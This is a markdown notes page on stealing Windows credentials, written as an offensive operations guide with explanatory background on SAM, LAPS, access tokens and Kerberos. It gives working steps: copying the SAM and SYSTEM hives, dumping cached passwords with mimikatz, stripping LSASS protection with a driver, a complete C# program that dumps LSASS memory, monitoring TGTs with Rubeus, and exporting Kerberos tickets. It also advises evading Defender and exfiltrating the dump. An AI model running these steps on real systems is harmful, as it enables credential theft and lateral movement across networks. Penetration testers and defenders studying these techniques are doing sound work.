---
title: Windows credentials
tags:
  - breach
  - operations
  - windows
  - credentials
  - sam
  - ntlm
  - privilege
  - privileges
  - escalating
  - escalation
  - active
  - directory
  - mimikatz
  - kerberos
---

## SAM database

The **Security Account Manager (SAM)** database stores local credentials for
Windows users as password hashes using the **NTLM** hashing format. NTLM hashes
can be used to authenticate to different machines, as long as the hash is tied
to a user account and password registered on the new machine.

It's unlikely you'll find matching local credentials applicable to users on
different machines - but there is the default **Administrator** account that can
be used for lateral movement. The Administrator account has been disabled by
default since the release of Windows Vista. Nevertheless, we'll discuss this
technique in the event a system administrator is using the Administrator
account.

We can invoke the following **PowerShell** to obtain the domain name of the
local computer and details about the Administrator account:

```powershell
$domain = $env:ComputerName
[wmi] "Win32_userAccount.Domain='$domain',Name='Administrator'"
```

The SAM database is stored at `C:\Windows\System32\config\SAM`, however, the
**SYSTEM**process has an exclusive lock on the file - we can't acquire a
**HANDLE** for it. To bypass this restriction, we can create a **shadow copy**
of the `C:\` drive using `wmic` in an administrative command prompt:

```cmd
wmic shadowcopy call create volume='c:\'
```

Verify that the shadow copy was created by invoking:

```cmd
vssadmin list shadows
```

And copy the SAM database and its encryption key, contained in the `SYSTEM`
file, by invoking:

```cmd
cp "${SAM_SHADOW_COPY_PATH}\Windows\System32\config\SAM" ${DESTINATION}
cp "${SAM_SHADOW_COPY_PATH}\Windows\System32\config\SYSTEM" ${DESTINATION}
```

Alternatively, we can acquire the SAM database and the SYSTEM file from the
registry:

```cmd
reg save HKLM\SAM ${DESTINATION}
reg save HKLM\SYSTEM ${DESTINATION}
```

Tools like [mimikatz](https://github.com/ParrotSec/mimikatz) and
[creddump7](https://github.com/CiscoCXSecurity/creddump7) can be used to decrypt
the SAM database using the acquired SYSTEM file. We can also use a
**meterpreter** agent with administrative privileges to execute the `hashdump`
command, dumping the NTLM hashes of a target machine.

## LAPS

Managing credentials for privileged users is hard, so Microsoft created the
**Local Administrator Password Solution (LAPS)** to manage the local
administrator password for domain-joined computers. Using the
[LAPSToolkit](https://github.com/leoloobeek/LAPSToolkit) **PowerShell** script,
we're able to enumerate which users or groups have the authorization to read
local administrator passwords for domain-joined computers.

## Access tokens

### Defining features

The Windows kernel issues users **access tokens** upon successful
authentication. These access tokens authorize users to create processes at a
certain **integrity level** with certain **privileges**.

### What are integrity levels?

Windows defines four integrity levels:

- Low
- Medium
- High
- System Sandbox processes like web browsers run in a low integrity level.
  Applications spawned by a user run with a medium integrity level. High
  integrity level applications are spawned by administrators. The system
  integrity level is reserved for **SYSTEM** services.

A process of a lower integrity level cannot modify a process with a higher
integrity level. Local administrators are issued two (2) tokens upon
authentication, medium and high. When administrative users select "**Run as
administrator**", their high integrity level access token is used to invoke the
process. This action usually prompts for **User Account Control (UAC)** consent
from the administrator.

### What are privileges?

**Privileges** are a set of access rights present within the token, defined by
two (2) bitmasks. They govern what actions a process can perform. The first
bitmask is immutable and describes the list of approved actions with the token.
The second bitmask is mutable, and describes which privileges are enabled or
disabled for the token. The state of the second bitmask can be updated with the
Win32 API method
[AdjustTokenPrivileges](https://learn.microsoft.com/en-us/windows/win32/api/securitybaseapi/nf-securitybaseapi-adjusttokenprivileges).

We can inspect the current user's privileges by invoking the following:

```powershell
whoami /priv
```

We can also use the
[LsaAddAccountRights](https://learn.microsoft.com/en-us/windows/win32/api/ntsecapi/nf-ntsecapi-lsaaddaccountrights)
API to add a set of privileges for a user, which will be assigned to that user's
access token next time they login. This can also be done by invoking the
`secpol.msc` application.

### Impersonation tokens

We can create **impersonation tokens**, allowing us to act on a user's behalf
without that user's credentials. These tokens have four levels, as well:

- Anonymous
- Identification
- Impersonation
- Delegation

The **anonymous** and **identification** impersonation tokens only allow for
enumeration of a user's information. **Impersonation** allows us to impersonate
the client's identity and **delegation** makes it possible to perform sequential
access control checks across multiple machines in the domain.

## Kerberos

**Kerberos** has been Microsoft's primary authentication system for Window
Server since 2003. In contrast to NTLM's challenge and response authentication
mechanism, Kerberos uses a ticketing system. The following actions occur when a
client requests access to an application within a domain using Kerberos:

- The Domain Controller (DC) serves as the Key Distribution Center (KDC)
- The client requests to authenticate to the KDC and the KDC replies with a
  success or failure of this authentication:
  - **Authentication Server Request (AS_REQ)**
    - Timestamp encrypted using a hash derived from the user's username and
      password
  - **Authentication Server Reply (AS_REP)**
    - Server conducts hash lookup to verify identity and decrypts the timestamp
      to check for a replay attack
    - Server replies with a session key encrypted using the user's password hash
      and a **Ticket Granting Ticket (TGT)**. The TGT is encrypted by the
      server's secret key to avoid tampering.
    - The TGT contains the following information:
      - User information including group memberships
      - Domain name
      - Timestamp
      - Client IP address
      - Session key
- The client sends a **Ticket Granting Service request** to the KDC after
  successful authentication and receive a **Ticket Granting Server reply**
  - **Ticket Granting Service Request (TGS_REQ)**
    - Packet that consists of:
      - Current user
      - Timestamp encrypted using the session key
      - Service Principal Name (SPN) of the resource
      - TGT
  - **Ticket Granting Server Reply (TGS_REP)**
    - Server decrypts the TGT with its secret and validates the session key,
      timestamp, user identity, and SPN
    - Replies with:
      - SPN (encrypted with TGT session key)
      - Session key to interact with the SPN (encypted with TGT session key)
      - Service ticket containing username, group membership, and session key
        (encrypted with password hash of the service account owning the SPN)
- With a valid ticket, the client can now request to authenticate to the
  application server and receives authorization to use the application server
  after successful authentication
  - **Application Request (AP_REQ)**
    - Username, timestamp encrypted with the session key, and the service ticket
  - **Application Response (AP_RES)**
    - Service decrypts the service ticket using its password hash, extracts the
      session key, and decrypts the username
    - If the usernames match, the request is accepted. Authorization is granted
      if the user's group memberships match the group memberships specified in
      the service ticket

### Stealing TGTs from memory

We can use toolkits like [Rubeus](https://github.com/GhostPack/Rubeus) to dump
TGTs from memory when a user authenticates to Kerberos. We can invoke a monitor
to dump TGTs live with the following:

```powershell
Start-Process `
	-FilePath "Rubeus.exe" `
	-ArgumentList @(
		"monitor",
		"/interval:1"
	)
```

[Here's a great guide ](https://tw1sm.github.io/2021-02-01-kerberos-conversion/)on
how to use the Base64 TGTs dumped by this toolkit.

## Mimikatz

**Mimikatz** extracts cached credentials from memory, thanks to the way Kerberos
needs to keep them cached for quick access and implementation of its protocol.
Password hashes are cached in the **Local Security Authority Subsystem Service
(LSASS)** memory space. If you got your hands on this cache and these hashes,
given enough time, you could crack user passwords for the target domain.

LSASS is a service, so it runs as SYSTEM. We need a SYSTEM level process to
attack the cache. Windows Local Administrators maintain the
**SeDebugPrivilege**, enabling them to read and modify processes executed by
other users. In the `mimikatz.exe` command line interface (CLI), we can invoke
the following to enable this privilege for the `mimikatz` process and dump all
cached passwords:

```cmd
C:\> mimikatz.exe
mimikatz # privilege::debug
mimikatz # sekurlsa::logonpasswords
```

### PPL protection

To defeat this information disclosure, Windows implemented another modifying
security level titled, "**Protected Processes Light (PPL)**", preventing SYSTEM
level processes from accessing and modifying the memory of a process executing
at SYSTEM level with PPL enabled. LSASS supports PPL, but not by default. The
registry key to enable this feature is
`HKLM\SYSTEM\CurrentControlSet\Control\Lsa`.

Fun fact, PPL protection is controlled by a bit mask in kernel memory located in
the **EPROCESS** object associated with the target process in user memory space.
Mimikatz comes bundled with the **mimidrv.sys** driver, which can be loaded in
the target's system drivers to attack this security control.

Running as a Local Administrator or the SYSTEM user, we'll have to maintain the
**SeLoadDriverPrivilege** privilege and the ability to load signed drivers. With
those two prerequisites, we can invoke the following to unprotect a target
process:

```cmd
mimikatz # !+
mimikatz # !processprotect /process:lsass.exe /remove
```

### Processing creds offline

To avoid triggering Defender detections, as a Local Administrator we can use a
program like **Task Manager** to create a dump file of `lsass.exe`'s process
memory. We can then exfil this data back home and process the dump with
`mimikatz.exe` locally:

```cmd
mimikatz # sekurlsa::minimdump lsass.dmp
```

We can also use **ProcDump** from the **SysInternals** suite to dump process
memory from target processes.

Finally, here's some C# .NET code that uses interoperability to dump process
memory from `lsass.exe` - make sure to invoke this as a Local Administrator or
SYSTEM:

```csharp
using System.Diagnostics;
using System.Runtime.InteropServices;

namespace MiniDump;

class Program
{
    [DllImport("dbghelp.dll")]
    static extern bool MiniDumpWriteDump(
        IntPtr hProcess,
        int ProcessId,
        IntPtr hFile,
        int DumpType,
        IntPtr ExceptionParam,
        IntPtr UserStreamParam,
        IntPtr CallbackParam
    );

    [DllImport("kernel32.dll")]
    static extern IntPtr OpenProcess(
        uint processAccess,
        bool bInheritHandle,
        int processId
    );

    static void Main()
    {
        FileStream dumpFile = new(
            "C:\\Windows\\tasks\\lsass.dmp",
            FileMode.Create
        );
        Process[] lsass = Process.GetProcessesByName("lsass");
        int lsass_pid = lsass[0].Id;
        IntPtr handle = OpenProcess(0x001F0FFF, false, lsass_pid);
        MiniDumpWriteDump(
            handle,
            lsass_pid,
            dumpFile.SafeFileHandle.DangerousGetHandle(),
            2,
            IntPtr.Zero,
            IntPtr.Zero,
            IntPtr.Zero
        );
    }
}
```

### Acquiring tickets

In an administrative meterpreter session on a Windows target, we can attempt to
dump all Kerberos tickets from memory to acquire TGTs by invoking the following:

```bash
meterpreter> kiwi_cmd "sekurlsa::tickets /export"
```

We can copy paste the Base64 dumps of these tickets to convert them to
**ccache** files for use on our Kali machine with **impacket** by invoking the
following:

```bash
base64 -d ${BASE64_TGT} > ${OUTFILE}.kirbi
python /usr/share/doc/python3-impacket/examples/ticketConverter.py ${OUTFILE}.kirbi ${OUTFILE}.ccache
```
